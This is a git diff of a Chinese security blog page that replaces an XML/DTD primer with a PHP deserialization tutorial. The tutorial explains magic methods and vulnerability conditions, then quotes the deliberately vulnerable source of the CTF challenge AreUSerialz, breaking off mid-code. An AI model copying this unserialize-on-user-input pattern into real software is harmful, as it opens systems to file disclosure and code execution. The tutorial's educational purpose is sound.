@@ -4,13 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="XML基础介绍, 白芨的小屋">
-    <meta name="description" content="XMLXML简介​    XML（EXtensible Markup Language）可扩展标记语言。XML是一种标记语言，很类似HTML，但并非HTML的替代，XML设计的宗旨是传输数据而非显示数据。
-
-
-
-
-XML文档构建模块一个 X">
+    <meta name="keywords" content="php反序列化, 白芨的小屋">
+    <meta name="description" content="PHP反序列化序列化为什么要进行序列化
+当对一个变量赋值后，在本次程序运行完成后，变量会从内存中清除掉。而序列化的目的时把变量保存在硬盘中，用到时可方便的通过反序列化把之前序列化的内容变回可用变量。即序列化用于在存储或传递PHP的值的过程中">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -22,7 +18,7 @@ XML文档构建模块一个 X">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>XML基础介绍 | 白芨的小屋</title>
+    <title>php反序列化 | 白芨的小屋</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -319,7 +315,7 @@ XML文档构建模块一个 X">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">XML基础介绍</h1>
+                    <h1 class="description center-align post-title">php反序列化</h1>
                 </div>
             </div>
         </div>
@@ -439,6 +435,10 @@ XML文档构建模块一个 X">
                                 <span class="chip bg-color">web安全基础</span>
                             </a>
                         
+                            <a href="/tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
+                            </a>
+                        
                     </div>
                     
                 </div>
@@ -460,7 +460,7 @@ XML文档构建模块一个 X">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.3k
+                    1.4k
                 </div>
                 
 
@@ -480,153 +480,243 @@ XML文档构建模块一个 X">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h1><h2 id="XML简介"><a href="#XML简介" class="headerlink" title="XML简介"></a>XML简介</h2><p>​    XML（EXtensible Markup Language）可扩展标记语言。XML是一种标记语言，很类似HTML，但并非HTML的替代，XML设计的宗旨是<strong>传输数据</strong>而非<strong>显示数据</strong>。</p>
-<!--XML被设计为传输和存储数据，其焦点是**数据的内容**。-->
-
-<!--HTML被设计用来显示数据，其焦点是**数据的外观*。-->
-
-<h2 id="XML文档构建模块"><a href="#XML文档构建模块" class="headerlink" title="XML文档构建模块"></a>XML文档构建模块</h2><h3 id="一个-XML-文档实例-元素"><a href="#一个-XML-文档实例-元素" class="headerlink" title="一个 XML 文档实例-元素"></a>一个 XML 文档实例-元素</h3><p>XML 文档必须有一个元素是所有其他元素的<strong>父元素</strong>。该元素称为<strong>根元素</strong>。</p>
-<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token comment">&lt;!--XML声明,定义 XML 的版本 (1.0) 和所使用的编码 UTF-8--></span>
-<span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
-<span class="token comment">&lt;!--根元素--></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span> 
-<span class="token comment">&lt;!--4个子元素--></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>George<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>John<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>Don't forget the meeting!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
-<span class="token comment">&lt;!--根元素结尾--></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="一个-XML-文档实例-属性"><a href="#一个-XML-文档实例-属性" class="headerlink" title="一个 XML 文档实例-属性"></a>一个 XML 文档实例-属性</h3><p>​    XML 元素可以在开始标签中包含属性，且属性值必须被引号包围，单引号和双引号均可使用。</p>
-<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>person</span> <span class="token attr-name">sex</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>female<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>						<span class="token comment">&lt;!--sex是一个属性--></span>
-  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>firstname</span><span class="token punctuation">></span></span>Anna<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>firstname</span><span class="token punctuation">></span></span>
-  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lastname</span><span class="token punctuation">></span></span>Smith<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lastname</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>person</span><span class="token punctuation">></span></span> 
-
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>person</span><span class="token punctuation">></span></span>
-  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sex</span><span class="token punctuation">></span></span>female<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sex</span><span class="token punctuation">></span></span>								<span class="token comment">&lt;!--sex是一个子元素--></span>
-  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>firstname</span><span class="token punctuation">></span></span>Anna<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>firstname</span><span class="token punctuation">></span></span>
-  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lastname</span><span class="token punctuation">></span></span>Smith<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lastname</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>person</span><span class="token punctuation">></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h3><p>​    实体是用来定义普通文本的变量。实体引用是对实体的引用。所有实体均以<code>&amp;</code>开始，以<code>;</code>结束。当文档被XML解析器解析时，实体就会被展开。下面实体在XML中被预定义。</p>
-<table>
+                <h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p><strong>为什么要进行序列化</strong></p>
+<p>当对一个变量赋值后，在本次程序运行完成后，变量会从内存中清除掉。而<strong>序列化</strong>的目的时把变量保存在硬盘中，用到时可方便的通过<strong>反序列化</strong>把之前序列化的内容变回可用变量。即序列化用于在存储或传递PHP的值的过程中，同时不丢失其类型和结构。利于对象的<strong>保存</strong>和<strong>传输</strong>。<br><img src="https://img-blog.csdnimg.cn/20210429223736297.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="两个函数"><a href="#两个函数" class="headerlink" title="两个函数"></a>两个函数</h2><table>
 <thead>
 <tr>
-<th>实体引用</th>
-<th>字符</th>
+<th>序列化</th>
+<th>反序列化</th>
 </tr>
 </thead>
 <tbody><tr>
-<td><code>&amp;lt;</code></td>
-<td>&lt;</td>
+<td>对象转换为字符串</td>
+<td>特定格式的字符串转换为对象</td>
 </tr>
 <tr>
-<td><code>&amp;gt;</code></td>
-<td>&gt;</td>
-</tr>
-<tr>
-<td><code>&amp;amp;</code></td>
-<td>&amp;</td>
-</tr>
-<tr>
-<td><code>&amp;quot;</code></td>
-<td>“</td>
-</tr>
-<tr>
-<td><code>apos;</code></td>
-<td>‘</td>
+<td>函数：serialize()</td>
+<td>函数：unseriasize()</td>
 </tr>
 </tbody></table>
-<h3 id="PCDATA"><a href="#PCDATA" class="headerlink" title="PCDATA"></a>PCDATA</h3><p>​    PCDATA的意思是<strong>被解析</strong>的<strong>字符数据</strong>。可想象为开始标签与结束标签之间的文本，是会被解析器解析的文本，这些文本将被解析器<strong>检查实体</strong>以及<strong>标记</strong>。文本中的标签会被当作标记来处理，而实体会被展开。</p>
-<p>​    被解析的字符数据不应当包含任何 &amp;、&lt; 或者 &gt; 字符；需要使用 <code>&amp;amp;</code>、<code>&amp;lt; </code>以及<code> &amp;gt;</code> 实体来分别替换它们。</p>
-<h3 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h3><p>​    CDATA 的意思是字符数据（character data）。</p>
-<p>​    CDATA 是<strong>不会被解析器解析</strong>的文本。在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开</p>
-<h2 id="DTD简介"><a href="#DTD简介" class="headerlink" title="DTD简介"></a>DTD简介</h2><p>​    文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。</p>
-<p>DTD 可被成行地声明于 <strong>XML 文档中</strong>，也可作为一个<strong>外部引用</strong>。</p>
-<h2 id="一个DTD在XML内部声明的实例"><a href="#一个DTD在XML内部声明的实例" class="headerlink" title="一个DTD在XML内部声明的实例"></a>一个DTD在XML内部声明的实例</h2><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;											&lt;!--XML声明,定义 XML 的版本 (1.0)--&gt;
-&lt;!DOCTYPE note [													&lt;!--定义此文档是note类型的文档--&gt;
-  &lt;!ELEMENT note (to,from,heading,body)&gt;	&lt;!--定义note有4个元素：“to、from、heading、body”--&gt;
-  &lt;!ELEMENT to      (#PCDATA)&gt;			  		&lt;!--定义 to 元素为 &quot;#PCDATA&quot; 类型--&gt;
-  &lt;!ELEMENT from    (#PCDATA)&gt;						&lt;!--定义 from 元素为 &quot;#PCDATA&quot; 类型--&gt;
-  &lt;!ELEMENT heading (#PCDATA)&gt;						&lt;!--定义 heading 元素为 &quot;#PCDATA&quot; 类型--&gt;
-  &lt;!ELEMENT body    (#PCDATA)&gt;						&lt;!--定义 body 元素为 &quot;#PCDATA&quot; 类型--&gt;
-]&gt;
-&lt;note&gt;
-  &lt;to&gt;George&lt;&#x2F;to&gt;
-  &lt;from&gt;John&lt;&#x2F;from&gt;
-  &lt;heading&gt;Reminder&lt;&#x2F;heading&gt;
-  &lt;body&gt;Don&#39;t forget the meeting!&lt;&#x2F;body&gt;
-&lt;&#x2F;note&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="一个DTD在XML外部声明的实例"><a href="#一个DTD在XML外部声明的实例" class="headerlink" title="一个DTD在XML外部声明的实例"></a>一个DTD在XML外部声明的实例</h2><p>​    若 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p>
-<p><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code></p>
-<p>包含DTD的“note.dtd”文件:</p>
-<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!ELEMENT note (to,from,heading,body)&gt;
-&lt;!ELEMENT to (#PCDATA)&gt;
-&lt;!ELEMENT from (#PCDATA)&gt;
-&lt;!ELEMENT heading (#PCDATA)&gt;
-&lt;!ELEMENT body (#PCDATA)&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>拥有外部DTD文档实例：</p>
-<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
-&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;			&lt;!--包含DTD的“note.dtd”文件,封装在DOCTYPE定义中--&gt;
-&lt;note&gt;
-&lt;to&gt;George&lt;&#x2F;to&gt;
-&lt;from&gt;John&lt;&#x2F;from&gt;
-&lt;heading&gt;Reminder&lt;&#x2F;heading&gt;
-&lt;body&gt;Don&#39;t forget the meeting!&lt;&#x2F;body&gt;
-&lt;&#x2F;note&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h2><ul>
-<li>参数实体只能在DTD中使用</li>
-<li>参数实体可嵌套定义，但内层定义的参数实体<code>%</code>需要<strong>HTML转义</strong>。</li>
+<p><strong>serialize():</strong></p>
+<p>当在php中创建了一个对象后，可以通过serialize()把这个对象转变成一个字符串，保存对象的值方便之后的传递与使用。</p>
+<p>eg:<br><img src="https://img-blog.csdnimg.cn/20210429223801901.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><strong>unserialize():</strong></p>
+<p>与 serialize() 对应，unserialize()用于将serialize() 函数序列化后的对象或数组进行反序列化，并返回原始对象结构。</p>
+<p><img src="https://img-blog.csdnimg.cn/20210429223824617.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>如果传递的字符串不可反序列化，则返回 FALSE，并产生一个E_NOTICE。</p>
+<p><img src="https://img-blog.csdnimg.cn/20210429223936636.jpg" alt="在这里插入图片描述"></p>
+<p><strong>字符串结构解释</strong></p>
+<p><strong>a:4:{s:4:”name”;s:4:”twds”;s:3:”age”;s:2:”22”;s:3:”sex”;s:3:”男”;s:5:”phone”;s:6:”123456”;}</strong></p>
+<ul>
+<li>a-&gt;array</li>
+<li>s-&gt;strings</li>
+<li>a:4-&gt;代表集合中有4个元素</li>
+<li>s:4:’name’-&gt;类型 为string:变量长度为4个字节:变量名为name。（之后同理）</li>
 </ul>
+<h2 id="PHP中的魔术方法"><a href="#PHP中的魔术方法" class="headerlink" title="PHP中的魔术方法"></a>PHP中的魔术方法</h2><p><strong>PHP中把以两个下划线__开头的方法称为魔术方法</strong></p>
 <table>
 <thead>
 <tr>
+<th>常见php魔术方法</th>
 <th></th>
-<th>一般实体声明：</th>
-<th>引用：</th>
-<th>参数实体声明：</th>
-<th>引用：</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>内部实体</td>
-<td><code>&lt;!ENTITY 实体名 实体的值 &gt;</code></td>
-<td>&amp;实体名</td>
-<td><code>&lt;!ENTITY %实体名 &quot;实体的值&quot;&gt; </code></td>
-<td>%实体名；</td>
+<td>__construct()</td>
+<td>类的构造函数，当一个对象创建时被调用</td>
 </tr>
 <tr>
-<td>外部实体</td>
-<td><code>&lt;!ENTITY 实体名 SYSTEM  url &gt;</code></td>
-<td>&amp;实体名</td>
-<td><code>&lt;!ENTITY %实体名 SYSTEM url&gt; </code></td>
-<td>%实体名；</td>
+<td>__destruct()</td>
+<td>类的析构函数，当一个对象销毁时被调用</td>
+</tr>
+<tr>
+<td>__wakeup()</td>
+<td>执行unserialize()时会先调用这个函数</td>
+</tr>
+<tr>
+<td>__sleep()</td>
+<td>执行serialize()时会先调用这个函数</td>
+</tr>
+<tr>
+<td>__toString()</td>
+<td>类被当成字符串时的被调用</td>
+</tr>
+<tr>
+<td>__isset()</td>
+<td>在不可访问的属性上调用isset()或empty()触发</td>
+</tr>
+<tr>
+<td>__unset()</td>
+<td>在不可访问的属性上使用unset()时触发</td>
+</tr>
+<tr>
+<td>__get()</td>
+<td>用于从不可访问的属性读取数据</td>
+</tr>
+<tr>
+<td>__set()</td>
+<td>用于将数据写入不可访问的属性</td>
+</tr>
+<tr>
+<td>__call()</td>
+<td>在对象上下文中调用不可访问的方法时触发</td>
+</tr>
+<tr>
+<td>__invoke()</td>
+<td>当脚本尝试将对象调用为函数时触发</td>
 </tr>
 </tbody></table>
-<p><strong>实例：</strong></p>
-<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
-&lt;!DOCTYPE message [
-    &lt;!ENTITY normal    &quot;hello&quot;&gt;     &lt;!-- 内部一般实体 --&gt;
-    &lt;!ENTITY % normal2 &quot;hello&quot;&gt;     &lt;!-- 内部参数实体 --&gt;
-    &lt;!ENTITY normal3 SYSTEM &quot;http:&#x2F;&#x2F;xml.org&#x2F;hhh.dtd&quot;&gt;    &lt;!-- 外部一般实体 --&gt;
-    &lt;!ENTITY % normal4 SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;1234.dtd&quot;&gt;        &lt;!-- 外部参数实体 --&gt;
-    %normal4;           			 &lt;!-- 引用参数实体 --&gt;
-]&gt;
-&lt;message&gt;&amp;normal;&lt;&#x2F;message&gt;    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-<h2 id="为什么使用DTD"><a href="#为什么使用DTD" class="headerlink" title="为什么使用DTD"></a>为什么使用DTD</h2><ul>
-<li>通过 DTD，每一个 XML 文件均可携带一个有关其<strong>自身格式</strong>的描述。</li>
-<li>独立的团体可一致地使用某个标准的 DTD 来<strong>交换数据。</strong></li>
-<li>应用程序也可使用某个标准的 DTD 来<strong>验证从外部接收到的数据</strong>。</li>
-<li>还可以使用 DTD 来<strong>验证您自身的数据</strong>。</li>
+<h2 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h2><p><strong>产生反序列化的原因：</strong></p>
+<p>根本原因：是程序没有对用户输入的反序列化字符串进行检测，导致<strong>反序列化过程</strong>可以被<strong>用户</strong>恶意控制，进而造成代码执行、getshell等一系列不可控的后果。反序列化漏洞并不是PHP特有，也存在于Java、Python等语言之中，但其原理基本相通。</p>
+<p><strong>漏洞产生条件：</strong></p>
+<ul>
+<li>unserialize()函数的参数可控</li>
+<li>php中有可以利用的类并且类中有魔术方法</li>
 </ul>
+<h2 id="CTF真题"><a href="#CTF真题" class="headerlink" title="CTF真题"></a>CTF真题</h2><p><strong>2020-网鼎杯-青龙组-Web-AreUSerialz</strong></p>
+<p>题目源码如下：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">FileHandler</span> <span class="token punctuation">&#123;</span>
+
+    <span class="token keyword">protected</span> <span class="token variable">$op</span><span class="token punctuation">;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>
+        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/tmp/tmpfile"</span><span class="token punctuation">;</span>
+        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Hello World!"</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Successful!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">else</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">output</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"[Result]: &lt;br>"</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">function</span> <span class="token function-definition function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+
+    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
